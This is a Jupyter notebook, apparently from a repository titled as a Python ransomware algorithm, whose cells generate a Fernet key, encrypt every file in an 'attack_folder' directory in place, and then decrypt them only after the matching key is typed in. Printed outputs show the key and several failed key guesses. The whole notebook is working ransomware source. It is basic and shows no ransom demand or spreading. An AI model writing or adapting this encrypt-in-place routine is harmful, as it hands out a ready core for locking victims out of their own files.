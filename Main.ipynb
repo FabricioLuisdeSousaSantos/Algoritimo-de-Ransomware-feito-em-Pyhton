{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "bfd71d75",
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Key is: b'wGEjiFB5iUkZm409UVOVH1duAvJI3r-xfhyX-kYL-40='\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "from cryptography.fernet import Fernet\n",
    "\n",
    "path = r'C:\\\\Users\\\\Fabrício Luís\\\\Desktop\\\\attack_folder'\n",
    "key = Fernet.generate_key()\n",
    "print('Key is:',key)\n",
    "\n",
    "#Save current key in txt file\n",
    "with open('C:\\\\Users\\\\Fabrício Luís\\\\Documents\\\\Python\\\\Worldlist.txt', 'wb') as keys:\n",
    "    keys.write(key)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f39912e7",
   "metadata": {},
   "source": [
    "# ENCRYPT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "cea77cf1",
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|████████████████████████████████████████████████████████████████████████████████████| 5/5 [00:05<00:00,  1.01s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Encrypting file now...\n",
      "Finish\n"
     ]
    }
   ],
   "source": [
    "import time\n",
    "from tqdm import tqdm\n",
    "for i in tqdm(range(5)):\n",
    "    time.sleep(1)\n",
    "    \n",
    "#---------------------------------------#\n",
    "\n",
    "print('Encrypting file now...')\n",
    "for item in os.listdir(path):\n",
    "    os.chdir(path)\n",
    "    with open(item, 'rb') as files:\n",
    "        data = files.read()\n",
    "        fernet = Fernet(key)\n",
    "        encrypted = fernet.encrypt(data)\n",
    "        with open(item, 'wb') as files2:\n",
    "            files2.write(encrypted)\n",
    "print('Finish')\n",
    "             "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e98489a5",
   "metadata": {},
   "source": [
    "# DECRYPT"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "81b04f1b",
   "metadata": {
    "collapsed": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|████████████████████████████████████████████████████████████████████████████████████| 5/5 [00:05<00:00,  1.01s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter key for Decrypts\n",
      "A key is wrong!\n",
      "Enter key for Decryptd\n",
      "A key is wrong!\n",
      "Enter key for Decrypt23\n",
      "A key is wrong!\n",
      "Enter key for DecryptwGEjiFB5iUkZm409UVOVH1duAvJI3r-xfhyX-kYL-40=\n",
      "Decrypting file now...\n",
      "Finish\n"
     ]
    }
   ],
   "source": [
    "import time\n",
    "from tqdm import tqdm\n",
    "for i in tqdm(range(5)):\n",
    "    time.sleep(1)\n",
    "    \n",
    "#---------------------------------------#\n",
    "\n",
    "while True:\n",
    "    key_current = input('Enter key for Decrypt')\n",
    "    key_current = key_current.encode('utf-8')\n",
    "    if key_current == key:\n",
    "        break\n",
    "    else:\n",
    "        print('A key is wrong!')\n",
    "        continue\n",
    "\n",
    "print('Decrypting file now...')\n",
    "for item in os.listdir(path):\n",
    "    os.chdir(path)\n",
    "    with open(item, 'rb') as files_enc:\n",
    "        data_enc = files_enc.read()\n",
    "        decrypted = fernet.decrypt(data_enc)\n",
    "        with open(item, 'wb') as files_decry:\n",
    "            files_decry.write(decrypted)\n",
    "print('Finish')\n",
    "\n",
    "   "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
